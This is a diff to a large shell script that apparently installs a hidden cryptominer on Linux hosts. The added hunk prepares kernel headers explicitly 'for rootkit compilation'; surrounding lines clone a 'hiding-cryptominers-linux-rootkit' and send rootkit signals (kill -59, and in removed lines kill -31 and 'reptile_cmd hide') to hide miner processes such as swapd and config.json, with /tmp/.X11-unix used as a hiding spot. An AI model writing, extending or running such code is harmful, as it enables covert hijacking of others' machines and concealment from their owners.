@@ -684,6 +684,32 @@ fi
 
 echo "[✓] Kernel headers installation attempted for $(uname -r)"
 
+# ==================== PREPARE KERNEL HEADERS (CRITICAL FOR ROOTKITS) ====================
+echo ""
+echo "[*] Preparing kernel headers for rootkit compilation..."
+KERNEL_VER=$(uname -r)
+KERNEL_SRC="/lib/modules/$KERNEL_VER/build"
+
+if [ -d "$KERNEL_SRC" ]; then
+    cd "$KERNEL_SRC" || true
+    if [ -f Makefile ]; then
+        echo "[*] Running 'make oldconfig && make prepare' in kernel source..."
+        # Suppress interactive prompts
+        yes "" | make oldconfig 2>/dev/null || true
+        make prepare 2>/dev/null || true
+        
+        # Verify critical files exist
+        if [ -f include/generated/autoconf.h ] && [ -f include/config/auto.conf ]; then
+            echo "[✓] Kernel headers prepared successfully"
+        else
+            echo "[!] WARNING: Kernel config files missing - rootkits may fail to build"
+        fi
+    fi
+    cd - >/dev/null || true
+else
+    echo "[!] WARNING: Kernel source directory not found at $KERNEL_SRC"
+fi
+
 # ==================== DWARVES & VMLINUX (BPF/eBPF Support) ====================
 echo ""
 echo "[*] Installing dwarves and copying vmlinux for BPF support..."
@@ -1478,29 +1504,6 @@ if [ -d /tmp ]; then
     }
 fi
 
-# Prepare kernel headers for module compilation
-echo "[*] Preparing kernel headers for rootkit compilation..."
-KERNEL_VER=$(uname -r)
-if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
-    cd "/usr/src/linux-headers-$KERNEL_VER" 2>/dev/null || {
-        echo "[!] Cannot access kernel headers directory"
-    }
-    
-    if [ -d "/usr/src/linux-headers-$KERNEL_VER" ] && [ "$(pwd)" = "/usr/src/linux-headers-$KERNEL_VER" ]; then
-        echo "[*] Running make oldconfig && make prepare..."
-        make oldconfig 2>/dev/null || true
-        make prepare 2>/dev/null || true
-        echo "[✓] Kernel headers prepared"
-    fi
-    
-    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
-else
-    echo "[!] Kernel headers directory not found, installing..."
-    apt-get install -y "linux-headers-$KERNEL_VER" 2>/dev/null || true
-    yum install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
-    dnf install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
-fi
-
 # Clone and build the crypto-miner rootkit
 echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
 export GIT_TERMINAL_PROMPT=0
@@ -2221,10 +2224,3 @@ send_sig 59 config.json swapd swapfile lightd
 echo "[✓] kill -59 sent"
 
 echo '========================================================================'
-
-# Hide running processes using rootkit signals
-kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
-kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-reptile_cmd hide
